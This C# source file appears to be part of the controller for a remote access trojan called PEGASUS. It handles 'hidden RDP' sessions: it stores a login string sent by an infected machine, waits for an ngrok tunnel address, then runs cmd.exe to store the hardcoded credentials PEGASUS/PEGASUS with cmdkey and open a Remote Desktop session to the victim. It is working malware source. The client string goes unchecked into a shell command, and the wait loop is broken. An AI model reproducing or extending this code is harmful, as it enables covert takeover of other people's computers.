using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using PEGASUS.Connection;
using PEGASUS.MessagePack;

namespace PEGASUS.Handle_Packet
	{
public class HandlehRDP
{
	public void handlehRDP(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("Hwid").AsString + "\\HRDP");
			string path = text + "\\RDP_Login.txt";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			File.Delete(path);
			File.WriteAllText(path, unpack_msgpack.ForcePathObject("login").AsString);
			string text2 = File.ReadAllText(path);
			do
			{
				Console.WriteLine("Waiting for connection");
			}
			while (!text2.Contains("ngrok"));
			cmdRemote_connect(text2);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void cmdRemote_connect(string login)
	{
		string arguments = "/c cmdkey.exe /generic:" + login + " /user:PEGASUS /pass:PEGASUS & mstsc.exe /v " + login + " & cmdkey /delete " + login;
		ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", arguments);
		Process process = new Process();
		process.StartInfo = startInfo;
		process.Start();
	}
}
}